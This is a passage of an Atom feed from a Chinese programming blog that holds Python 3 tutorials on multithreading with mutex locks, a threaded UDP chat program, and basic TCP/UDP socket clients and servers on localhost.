class="string">&quot;,&quot;</span>.join(folders))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>参考:<br><a href="https://docs.python.org/zh-cn/3/library/multiprocessing.html">multiprocessing — 基于进程的并行 — Python 3.9.5 文档</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;什么是进程？&quot;&gt;&lt;a href=&quot;#什么是进程？&quot; class=&quot;headerlink&quot; title=&quot;什么是进程？&quot;&gt;&lt;/a&gt;什么是进程？&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;程序：一个未运行的二进制文件，叫做程序。如Windows下的PE文件&lt;/p&gt;
&lt;/li&gt;
</summary>
      
    
    
    
    <category term="Python3" scheme="https://xin02.github.io/categories/Python3/"/>
    
    
    <category term="多进程" scheme="https://xin02.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    
    <category term="队列" scheme="https://xin02.github.io/tags/%E9%98%9F%E5%88%97/"/>
    
    <category term="进程池" scheme="https://xin02.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B1%A0/"/>
    
  </entry>
  
  <entry>
    <title>Python3 多线程</title>
    <link href="https://xin02.github.io/2021/06/05/Python3-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>https://xin02.github.io/2021/06/05/Python3-%E5%A4%9A%E7%BA%BF%E7%A8%8B/</id>
    <published>2021-06-05T12:28:00.000Z</published>
    <updated>2022-07-01T12:29:49.232Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简单实现多线程"><a href="#简单实现多线程" class="headerlink" title="简单实现多线程"></a>简单实现多线程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">sing</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---sing()---&#123;&#125;&quot;</span>.<span class="built_in">format</span>(sing))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dance</span>(<span class="params">dance</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---dance()---&#123;&#125;&quot;</span>.<span class="built_in">format</span>(dance))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    t1 = threading.Thread(target=sing,args=(<span class="string">&quot;t1&quot;</span>,))</span><br><span class="line">    t2 = threading.Thread(target=dance,args=(<span class="string">&quot;t2&quot;</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="多线程互斥锁"><a href="#多线程互斥锁" class="headerlink" title="多线程互斥锁"></a>多线程互斥锁</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">A = <span class="number">2</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="comment">#创建一个互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">sing</span>):</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500000</span>):</span><br><span class="line">        lock.acquire()</span><br><span class="line">        <span class="comment">#加锁</span></span><br><span class="line">        A += <span class="number">1</span></span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="comment">#解锁</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(sing,i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dance</span>(<span class="params">dance</span>):</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500000</span>):</span><br><span class="line">        lock.acquire()</span><br><span class="line">        <span class="comment">#加锁</span></span><br><span class="line">        A -= <span class="number">1</span></span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="comment">#解锁</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(dance,i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    t1 = threading.Thread(target=sing,args=(<span class="string">&quot;t1&quot;</span>,))</span><br><span class="line">    t2 = threading.Thread(target=dance,args=(<span class="string">&quot;t2&quot;</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line">    <span class="built_in">print</span>(A)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="查看线程数量"><a href="#查看线程数量" class="headerlink" title="查看线程数量"></a>查看线程数量</h2><p>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threading.<span class="built_in">enumerate</span>()</span><br></pre></td></tr></table></figure><p>获取当前所有线程。</p><p><img src="https://gitee.com/xlcm/images/raw/master/1487752-20210608163031419-1594559458.png" alt="img"></p><p> 此处打印出一个列表，列表中共有3个线程信息。一个是主线程，另外两个是子线程</p><p>这里需要注意，我们需要在代码中使用join()方法来阻塞主线程。当所有阻塞的子线程执行完毕后，才会继续执行主线程。</p><h2 id="通过继承Thread类，重写run方法实现多线程"><a href="#通过继承Thread类，重写run方法实现多线程" class="headerlink" title="通过继承Thread类，重写run方法实现多线程"></a>通过继承Thread类，重写run方法实现多线程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">A = <span class="number">2</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="comment">#创建一个互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my_thread</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.sing()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> A</span><br><span class="line">        <span class="keyword">if</span> self._kwargs[<span class="string">&#x27;mothed&#x27;</span>] == <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">            tmp = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> self._kwargs[<span class="string">&#x27;mothed&#x27;</span>] == <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line">            tmp = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            lock.acquire()</span><br><span class="line">            <span class="comment">#加锁</span></span><br><span class="line">            A += tmp</span><br><span class="line">            lock.release()</span><br><span class="line">            <span class="comment">#解锁</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;:&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self._kwargs[<span class="string">&#x27;cs&#x27;</span>],i,A))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    t1 = my_thread(kwargs=&#123;<span class="string">&#x27;cs&#x27;</span>:<span class="string">&#x27;sing&#x27;</span>,<span class="string">&#x27;mothed&#x27;</span>:<span class="string">&#x27;add&#x27;</span>&#125;,name=<span class="string">&quot;T1&quot;</span>)</span><br><span class="line">    t2 = my_thread(kwargs=&#123;<span class="string">&#x27;cs&#x27;</span>:<span class="string">&#x27;dance&#x27;</span>,<span class="string">&#x27;mothed&#x27;</span>:<span class="string">&#x27;del&#x27;</span>&#125;,name=<span class="string">&quot;T2&quot;</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    <span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())</span><br><span class="line">    <span class="built_in">print</span>(A)</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line">    <span class="built_in">print</span>(A)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="多线程UDP聊天器"><a href="#多线程UDP聊天器" class="headerlink" title="多线程UDP聊天器"></a>多线程UDP聊天器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my_thread</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self._kwargs[<span class="string">&#x27;mothed&#x27;</span>] == <span class="string">&#x27;recv_message&#x27;</span>:</span><br><span class="line">            self.recv_message()</span><br><span class="line">        <span class="keyword">elif</span> self._kwargs[<span class="string">&#x27;mothed&#x27;</span>] == <span class="string">&#x27;send_message&#x27;</span>:</span><br><span class="line">            self.send_message()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_message</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ip = <span class="built_in">input</span>(<span class="string">&quot;目标IP:&quot;</span>)</span><br><span class="line">                port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;目标端口:&quot;</span>))</span><br><span class="line">                msg = <span class="built_in">input</span>(<span class="string">&quot;发送的消息:&quot;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            self._kwargs[<span class="string">&#x27;udp_socket&#x27;</span>].sendto(msg,(ip,port))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_message</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                data,client_addr = self._kwargs[<span class="string">&#x27;udp_socket&#x27;</span>].recvfrom(<span class="number">1024</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;source:&#x27;</span>, client_addr,<span class="string">&#x27;收到的数据：&#x27;</span>, data.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    udp_socket.bind((<span class="string">&quot;&quot;</span>,<span class="number">20216</span>))</span><br><span class="line">    recv_message = my_thread(kwargs=&#123;<span class="string">&#x27;udp_socket&#x27;</span>:udp_socket,<span class="string">&#x27;mothed&#x27;</span>:<span class="string">&#x27;recv_message&#x27;</span>&#125;,name=<span class="string">&quot;recv_message&quot;</span>)</span><br><span class="line">    send_message = my_thread(kwargs=&#123;<span class="string">&#x27;udp_socket&#x27;</span>:udp_socket,<span class="string">&#x27;mothed&#x27;</span>:<span class="string">&#x27;send_message&#x27;</span>&#125;,name=<span class="string">&quot;send_message&quot;</span>)</span><br><span class="line">    recv_message.start()</span><br><span class="line">    send_message.start()</span><br><span class="line">    recv_message.join()</span><br><span class="line">    send_message.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简单实现多线程&quot;&gt;&lt;a href=&quot;#简单实现多线程&quot; class=&quot;headerlink&quot; title=&quot;简单实现多线程&quot;&gt;&lt;/a&gt;简单实现多线程&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    <category term="Python3" scheme="https://xin02.github.io/categories/Python3/"/>
    
    
    <category term="多线程" scheme="https://xin02.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    <category term="互斥锁" scheme="https://xin02.github.io/tags/%E4%BA%92%E6%96%A5%E9%94%81/"/>
    
  </entry>
  
  <entry>
    <title>Python3 网络编程（使用Socket实现TCP、UDP通信）</title>
    <link href="https://xin02.github.io/2021/06/04/Python3-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%88%E4%BD%BF%E7%94%A8Socket%E5%AE%9E%E7%8E%B0TCP%E3%80%81UDP%E9%80%9A%E4%BF%A1%EF%BC%89/"/>
    <id>https://xin02.github.io/2021/06/04/Python3-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%88%E4%BD%BF%E7%94%A8Socket%E5%AE%9E%E7%8E%B0TCP%E3%80%81UDP%E9%80%9A%E4%BF%A1%EF%BC%89/</id>
    <published>2021-06-04T05:08:00.000Z</published>
    <updated>2022-07-01T12:29:49.109Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TCP通信"><a href="#TCP通信" class="headerlink" title="TCP通信"></a>TCP通信</h1><h2 id="TCP-服务端"><a href="#TCP-服务端" class="headerlink" title="TCP_服务端"></a>TCP_服务端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="keyword">import</span> socket <span class="keyword">as</span> s</span><br><span class="line"> <span class="number">2</span> </span><br><span class="line"> <span class="number">3</span> tcp = s.socket(s.AF_INET,s.SOCK_STREAM)</span><br><span class="line"> <span class="number">4</span> tcp.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6666</span>))</span><br><span class="line"> <span class="number">5</span> tcp.listen(<span class="number">5</span>)</span><br><span class="line"> <span class="number">6</span> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> <span class="number">7</span>     <span class="comment"># 建立客户端连接</span></span><br><span class="line"> <span class="number">8</span>     clientsocket,addr = tcp.accept()      </span><br><span class="line"> <span class="number">9</span>     <span class="built_in">print</span>(<span class="string">&quot;连接地址: %s&quot;</span> % <span class="built_in">str</span>(addr))</span><br><span class="line"><span class="number">10</span>     msg = <span class="string">&#x27;欢迎访问&#123;&#125;！&#x27;</span>.<span class="built_in">format</span>(tcp.getsockname())+ <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"><span class="number">11</span>     clientsocket.send(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="number">12</span>     clientsocket.close()</span><br></pre></td></tr></table></figure><h2 id="TCP-客户端"><a href="#TCP-客户端" class="headerlink" title="TCP_客户端"></a>TCP_客户端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket <span class="keyword">as</span> s</span><br><span class="line"></span><br><span class="line">tcp = s.socket(s.AF_INET,s.SOCK_STREAM)</span><br><span class="line">tcp.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6666</span>))</span><br><span class="line">msg = tcp.recv(<span class="number">1024</span>)</span><br><span class="line">tcp.close()</span><br><span class="line"><span class="built_in">print</span> (msg.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="UDP通信"><a href="#UDP通信" class="headerlink" title="UDP通信"></a>UDP通信</h1><h2 id="UDP-服务端"><a href="#UDP-服务端" class="headerlink" title="UDP_服务端"></a>UDP_服务端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line">ip_port = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  <span class="comment"># udp协议</span></span><br><span class="line">server.bind(ip_port)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data,client_addr = server.recvfrom(BUFSIZE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;client地址：&#x27;</span>, client_addr,<span class="string">&#x27;server收到的数据：&#x27;</span>, data.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">    server.sendto(data,client_addr)</span><br><span class="line">server.close()</span><br></pre></td></tr></table></figure><h2 id="UDP-客户端"><a href="#UDP-客户端" class="headerlink" title="UDP_客户端"></a>UDP_客户端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&quot;</span>).strip()</span><br><span class="line">    ip_port = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    client.sendto(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>),ip_port)</span><br><span class="line"> </span><br><span class="line">    data,server_addr = client.recvfrom(BUFSIZE)</span><br><span class="line">    <span class="built_in">print</span>(server_addr,<span class="string">&#x27;服务端收到: &#x27;</span>,data.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TCP通信&quot;&gt;&lt;a href=&quot;#TCP通信&quot; class=&quot;headerlink&quot; title=&quot;TCP通信&quot;&gt;&lt;/a&gt;TCP通信&lt;/h1&gt;&lt;h2 id=&quot;TCP-服务端&quot;&gt;&lt;a href=&quot;#TCP-服务端&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="Python3" scheme="https://xin02.github.io/categories/Python3/"/>
    
    
    <category term="TCP" scheme="https://xin02.github.io/tags/TCP/"/>
    
    <category term="UDP" scheme="https://xin02.github.io/tags/UDP/"/>
    
  </entry>
  
</feed>
